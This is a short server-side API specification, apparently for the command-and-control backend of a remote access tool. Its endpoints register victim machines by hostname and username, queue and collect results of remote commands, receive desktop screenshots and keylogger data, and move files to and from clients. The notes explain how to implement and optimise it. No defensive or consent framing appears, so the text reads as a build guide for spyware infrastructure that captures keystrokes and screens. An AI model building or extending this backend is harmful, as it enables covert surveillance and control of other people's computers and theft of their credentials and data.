API ENDPOINTS TO IMPLEMENT ON THE SERVER SIDE:

The following endpoints need to be implemented on your server to handle the client connections:

1. POST /api/clients/register
   - Registers a new client
   - Body: { id, hostname, username, os, ip, status }
   - Response: 200 OK

2. GET /api/clients/{id}/commands
   - Gets pending commands for a client
   - Response: Array of command objects

3. POST /api/clients/{id}/command-results
   - Receives the results of a command execution
   - Body: { command, output, error }
   - Response: 200 OK

4. PUT /api/clients/{id}/status
   - Updates client online status
   - Body: { status, lastSeen }
   - Response: 200 OK

5. POST /api/clients/{id}/desktop-stream
   - Receives desktop screenshots
   - Body: Binary image data
   - Response: 200 OK

6. POST /api/clients/{id}/keylog
   - Receives keylog data
   - Body: { data }
   - Response: 200 OK

7. POST /api/clients/{id}/commands/{commandId}/ack
   - Acknowledges command execution
   - Response: 200 OK

8. POST /api/clients/{id}/file-transfers
   - Reports file transfer status
   - Body: { path, status }
   - Response: 200 OK

9. GET /api/files
   - Downloads a file from the server
   - Query: ?path=<file_path>
   - Response: Binary file data

10. POST /api/files
    - Uploads a file to the server
    - Query: ?path=<file_path>
    - Body: Binary file data
    - Response: 200 OK

Implementation Notes:
- These endpoints should be secured with proper authentication
- Consider using WebSockets for real-time communication
- For desktop streaming, consider optimizing the image transfer (compression, delta updates)
- Store commands in a queue for each client
- Implement proper error handling and logging
